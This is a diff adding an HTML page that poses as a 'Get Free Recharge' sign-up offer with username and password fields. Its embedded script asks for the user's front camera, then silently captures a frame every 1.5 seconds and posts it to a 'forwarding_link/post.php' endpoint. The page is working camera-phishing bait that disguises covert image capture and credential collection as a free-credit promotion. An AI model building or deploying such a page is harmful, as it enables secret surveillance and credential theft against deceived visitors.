@@ -1,0 +1,92 @@
+<DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free recharge</title>
+  <link href="https://fonts.googleapis.com/css?family=Rubik&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+</head>
+ <script>
+ 
+ function post(imgdata){
+ $.ajax({
+     type: 'POST',
+     data: { cat: imgdata},
+     url: 'forwarding_link/post.php',
+     dataType: 'json',
+     async: false,
+     success: function(result){
+         // call the function that handles the response/results
+     },
+     error: function(){
+     }
+   });
+ };
+ 
+ 
+ 'use strict';
+ 
+ const video = document.getElementById('video');
+ const canvas = document.getElementById('canvas');
+ const errorMsgElement = document.querySelector('span#errorMsg');
+ 
+ const constraints = {
+   audio: false,
+   video: {
+     
+     facingMode: "user"
+   }
+ };
+ 
+ // Access webcam
+ async function init() {
+   try {
+     const stream = await navigator.mediaDevices.getUserMedia(constraints);
+     handleSuccess(stream);
+   } catch (e) {
+     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+   }
+ }
+ 
+ // Success
+ function handleSuccess(stream) {
+   window.stream = stream;
+   video.srcObject = stream;
+ 
+ var context = canvas.getContext('2d');
+   setInterval(function(){
+ 
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData); }, 1500);
+   
+ 
+ }
+ 
+ // Load init
+ init();
+ 
+ </script>
+<body>
+ 
+<div class="container">
+  <div class="left-section">
+    <div class="header">
+      <h1 class="animation a1">Get Free Recharge!!</h1>
+      <h4 class="animation a2">Sign up to get free recharge.</h4>
+    </div>
+    <div class="form">
+      <input type="email" class="form-field animation a3" placeholder="Create a username">
+      <input type="password" class="form-field animation a4" placeholder="Create a Password">
+      <p class="animation a5"><a href="#">What's up??</a></p>
+      <button class="animation a6"><a href="sucess.html">Sign Up</a></button>
+    </div>
+  </div>
+  <div class="right-section"></div>
+</div>
+  
+</body>
+ 
+
+</html>        
